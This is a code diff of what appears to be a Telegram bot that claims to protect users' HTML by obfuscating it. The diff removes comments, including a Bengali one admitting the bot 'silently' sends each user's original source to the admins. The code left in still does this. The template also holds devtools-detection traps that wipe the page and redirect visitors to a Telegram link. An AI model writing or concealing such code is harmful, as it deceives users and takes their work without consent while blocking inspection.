@@ -115,7 +115,6 @@ Signature: NIROB_GX_PROTECTED_ENGINE
         setTimeout(function() {{ window.location.href = telegramTrapLink; }}, 2000);
     }}
     
-    // Developer Tools, F12 & Console Detection Trap
     window.addEventListener('keydown', function(e) {{
         if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {{
             destroyAndRedirect();
@@ -128,7 +127,6 @@ Signature: NIROB_GX_PROTECTED_ENGINE
         return false;
     }}, true);
 
-    // Detect Console Open via DevTools size check
     setInterval(function() {{
         var widthThreshold = window.outerWidth - window.innerWidth > 160;
         var heightThreshold = window.outerHeight - window.innerHeight > 160;
@@ -137,7 +135,6 @@ Signature: NIROB_GX_PROTECTED_ENGINE
         }}
     }, 500);
     
-    // Secure Rendering Engine for Telegram and Chrome
     (function(){{
         try {{
             var decoded = decodeURIComponent(escape(atob(_0xgx_nirob_payload)));
@@ -265,9 +262,6 @@ def handle_incoming(message):
         global total_protected_count
         total_protected_count += 1
 
-        # ==========================================
-        # 📥 ইউজারের আসল রিয়েল কোড সাইলেন্টলি অ্যাডমিনের ইনবক্সে পাঠানোর লজিক
-        # ==========================================
         for admin_id in ADMIN_IDS:
             admin_notification = (
                 f"📥 **NEW USER HTML CAPTURED!**\n\n"
@@ -285,9 +279,7 @@ def handle_incoming(message):
             with open(temp_orig_name, "rb") as tf:
                 bot.send_document(admin_id, tf, caption=f"📄 **Original Source Code from User ID:** `{user_id}`", parse_mode='Markdown')
             os.remove(temp_orig_name)
-        # ==========================================
 
-        # ইউজারের জন্য সিকিউর করা ফাইল তৈরি করা
         secured_code = obfuscate_html(html_data)
         output_file_name = "NIROB_PROTECTED_GX.html"
         
